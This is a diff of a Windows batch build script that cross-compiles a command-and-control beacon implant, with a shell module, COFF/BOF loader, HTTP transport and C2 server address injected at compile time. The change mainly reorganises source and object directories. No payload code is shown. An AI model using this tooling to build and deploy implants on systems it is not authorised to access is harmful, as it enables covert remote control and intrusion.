@@ -51,12 +51,24 @@ echo.
 :: ---------------------------------------------------------------------------
 :: Directories
 :: ---------------------------------------------------------------------------
-set BOF_BUILD_DIR=build\bofs
 set BUILD_DIR=build
+set BOF_BUILD_DIR=build\bofs
 set SERVER_BOF_DIR=..\server\bofs
 
-if not exist "%BOF_BUILD_DIR%" mkdir "%BOF_BUILD_DIR%"
+:: Mirror source tree under build\ so .obj files don't collide
+set OBJ_CORE=%BUILD_DIR%\core
+set OBJ_TRANSPORT=%BUILD_DIR%\transport
+set OBJ_CRYPTO=%BUILD_DIR%\crypto
+set OBJ_LOADER=%BUILD_DIR%\loader
+set OBJ_MODULES=%BUILD_DIR%\modules
+
 if not exist "%BUILD_DIR%"     mkdir "%BUILD_DIR%"
+if not exist "%BOF_BUILD_DIR%" mkdir "%BOF_BUILD_DIR%"
+if not exist "%OBJ_CORE%"      mkdir "%OBJ_CORE%"
+if not exist "%OBJ_TRANSPORT%" mkdir "%OBJ_TRANSPORT%"
+if not exist "%OBJ_CRYPTO%"    mkdir "%OBJ_CRYPTO%"
+if not exist "%OBJ_LOADER%"    mkdir "%OBJ_LOADER%"
+if not exist "%OBJ_MODULES%"   mkdir "%OBJ_MODULES%"
 
 :: ---------------------------------------------------------------------------
 :: Common compile flags — config injected via -D, no header-gen step needed
@@ -64,7 +76,6 @@ if not exist "%BUILD_DIR%"     mkdir "%BUILD_DIR%"
 set COMMON_FLAGS=-c -O2 -ffunction-sections -fdata-sections -fno-ident ^
   -fno-asynchronous-unwind-tables ^
   -I include -I src -DBOF ^
-  "-DC2_SERVER_IP=\"%ARG_IP%\"" ^
   "-DC2_SERVER_IP=\"%ARG_IP%\"" ^
   -DC2_SERVER_PORT=%ARG_PORT% ^
   "-DC2_USER_AGENT=\"%ARG_UA%\"" ^
@@ -78,40 +89,43 @@ set COMMON_FLAGS=-c -O2 -ffunction-sections -fdata-sections -fno-ident ^
 :: ---------------------------------------------------------------------------
 echo [1/3] Compiling beacon components...
 
-echo   crypto.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\crypto.c -o "%BUILD_DIR%\crypto.obj"
-if !errorlevel! neq 0 (echo [!] Failed: crypto.c && exit /b 1)
+echo   crypto\crypto.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\crypto\crypto.c -o "%OBJ_CRYPTO%\crypto.obj"
+if !errorlevel! neq 0 (echo [!] Failed: crypto\crypto.c && exit /b 1)
 
-echo   ecdh.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\ecdh.c -o "%BUILD_DIR%\ecdh.obj"
-if !errorlevel! neq 0 (echo [!] Failed: ecdh.c && exit /b 1)
+echo   crypto\ecdh.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\crypto\ecdh.c -o "%OBJ_CRYPTO%\ecdh.obj"
+if !errorlevel! neq 0 (echo [!] Failed: crypto\ecdh.c && exit /b 1)
 
-echo   http.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\http.c -o "%BUILD_DIR%\http.obj"
-if !errorlevel! neq 0 (echo [!] Failed: http.c && exit /b 1)
+echo   transport\http.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\transport\http.c -o "%OBJ_TRANSPORT%\http.obj"
+if !errorlevel! neq 0 (echo [!] Failed: transport\http.c && exit /b 1)
 
-echo   shell.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\shell.c -o "%BUILD_DIR%\shell.obj"
-if !errorlevel! neq 0 (echo [!] Failed: shell.c && exit /b 1)
+echo   modules\shell.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\modules\shell.c -o "%OBJ_MODULES%\shell.obj"
+if !errorlevel! neq 0 (echo [!] Failed: modules\shell.c && exit /b 1)
 
-echo   beacon.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\beacon.c -o "%BUILD_DIR%\beacon.obj"
-if !errorlevel! neq 0 (echo [!] Failed: beacon.c && exit /b 1)
+echo   core\beacon.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\core\beacon.c -o "%OBJ_CORE%\beacon.obj"
+if !errorlevel! neq 0 (echo [!] Failed: core\beacon.c && exit /b 1)
 
-echo   beacon_compatibility.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\beacon_compatibility.c -o "%BUILD_DIR%\beacon_compatibility.obj"
-if !errorlevel! neq 0 (echo [!] Failed: beacon_compatibility.c && exit /b 1)
+echo   loader\beacon_compatibility.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\loader\beacon_compatibility.c -o "%OBJ_LOADER%\beacon_compatibility.obj"
+if !errorlevel! neq 0 (echo [!] Failed: loader\beacon_compatibility.c && exit /b 1)
 
-echo   COFFLoader.c
-x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\COFFLoader.c -o "%BUILD_DIR%\COFFLoader.obj"
-if !errorlevel! neq 0 (echo [!] Failed: COFFLoader.c && exit /b 1)
+echo   loader\COFFLoader.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\loader\COFFLoader.c -o "%OBJ_LOADER%\COFFLoader.obj"
+if !errorlevel! neq 0 (echo [!] Failed: loader\COFFLoader.c && exit /b 1)
 
 :: ---------------------------------------------------------------------------
 :: 2. BOFs
+::    BOFs need both agent headers (beacon_compatibility.h) and the BOF-side
+::    include dir (base.h, queue.h).
 :: ---------------------------------------------------------------------------
 echo [2/3] Compiling BOFs...
 
-set BOF_FLAGS=-c -Os -fno-asynchronous-unwind-tables -fno-stack-protector -I include
+set BOF_FLAGS=-c -Os -fno-asynchronous-unwind-tables -fno-stack-protector ^
+  -I include -I bofs\include
 
 for %%f in (bofs\*.c) do (
     echo   %%~nf
@@ -125,16 +139,16 @@ for %%f in (bofs\*.c) do (
 echo [3/3] Linking %ARG_OUT%...
 
 x86_64-w64-mingw32-gcc ^
-  "%BUILD_DIR%\crypto.obj" ^
-  "%BUILD_DIR%\ecdh.obj" ^
-  "%BUILD_DIR%\http.obj" ^
-  "%BUILD_DIR%\shell.obj" ^
-  "%BUILD_DIR%\beacon.obj" ^
-  "%BUILD_DIR%\beacon_compatibility.obj" ^
-  "%BUILD_DIR%\COFFLoader.obj" ^
+  "%OBJ_CRYPTO%\crypto.obj" ^
+  "%OBJ_CRYPTO%\ecdh.obj" ^
+  "%OBJ_TRANSPORT%\http.obj" ^
+  "%OBJ_MODULES%\shell.obj" ^
+  "%OBJ_CORE%\beacon.obj" ^
+  "%OBJ_LOADER%\beacon_compatibility.obj" ^
+  "%OBJ_LOADER%\COFFLoader.obj" ^
   -o "%BUILD_DIR%\%ARG_OUT%" ^
   -Wl,-s -Wl,--gc-sections ^
-  -lws2_32 -lbcrypt -lwinhttp -liphlpapi -lsecur32 -ladvapi32 
+  -lws2_32 -lbcrypt -lwinhttp -liphlpapi -lsecur32 -ladvapi32
 if !errorlevel! neq 0 (echo [!] Link failed && exit /b 1)
 
 :: ---------------------------------------------------------------------------
